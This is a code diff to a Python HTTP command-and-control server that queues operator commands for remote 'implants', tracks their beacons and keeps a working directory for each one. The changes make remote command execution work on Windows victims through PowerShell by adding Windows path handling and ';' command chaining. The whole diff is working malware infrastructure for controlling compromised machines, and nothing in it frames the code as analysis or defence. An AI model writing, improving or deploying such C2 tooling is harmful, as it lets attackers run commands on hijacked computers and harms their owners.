@@ -53,7 +53,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 with global_lock:
                     cmd = http_sessions[uid].get("last_cmd", "None")
                     http_sessions[uid]["last_cmd"] = "None"
-                self.wfile.write(cmd.encode())
+                # Send newline so PowerShell treats combined commands as a full line
+                self.wfile.write((cmd + "\n").encode())
                 return
             elif path == beacon_path:
                 self.wfile.write(b"OK")
@@ -244,7 +245,6 @@ def c2_console():
                     if uid in http_sessions:
                         if cmd_input.startswith("cd"):
                             parts = cmd_input.split(maxsplit=1)
-                            new_dir = None
                             if len(parts) == 1:
                                 http_sessions[uid]['cwd'] = None
                             else:
@@ -252,15 +252,19 @@ def c2_console():
                                 if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
                                     arg = arg[1:-1]
                                 current_cwd = http_sessions[uid].get('cwd')
-                                if arg.startswith('/'):
-                                    new_dir = os.path.normpath(arg)
+                                is_absolute = bool(re.match(r'^[A-Za-z]:[\\\\/]', arg)) or arg.startswith('/') or arg.startswith('\\\\')
+                                if is_absolute or not current_cwd:
+                                    new_dir = arg
                                 else:
-                                    base_dir = current_cwd if current_cwd else "."
-                                    new_dir = os.path.normpath(os.path.join(base_dir, arg))
+                                    sep = '\\\\' if ('\\\\' in current_cwd or re.match(r'^[A-Za-z]:', current_cwd)) else '/'
+                                    if current_cwd.endswith(sep):
+                                        new_dir = f"{current_cwd}{arg}"
+                                    else:
+                                        new_dir = f"{current_cwd}{sep}{arg}"
                                 http_sessions[uid]['cwd'] = new_dir
                         else:
                             cwd = http_sessions[uid].get('cwd')
-                            to_send = f'cd "{cwd}" && {cmd_input}' if cwd else cmd_input
+                            to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
                             http_sessions[uid]['last_cmd'] = to_send
                     else:
                         print(f"[!] HTTP implant {uid} is no longer active.")
